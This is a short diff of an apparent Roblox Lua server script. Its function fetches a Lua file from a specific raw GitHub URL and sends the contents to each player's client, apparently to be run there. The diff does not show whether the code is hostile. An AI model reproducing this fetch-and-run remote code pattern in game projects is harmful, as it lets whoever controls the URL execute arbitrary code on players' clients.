@@ -102,7 +102,7 @@ end
 -- ФУНКЦИЯ ОТПРАВКИ КОДА
 local function SendCodeToPlayer(player)
 	local success, clientCode = pcall(function()
-		return game:GetService("HttpService"):GetAsync("https://githubusercontent.com")
+		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/serezanet2/Roblox/refs/heads/main/V_njeafnjd_client_eco.lua")
 	end)
 	if success then
 		RE2:FireClient(player, clientCode)
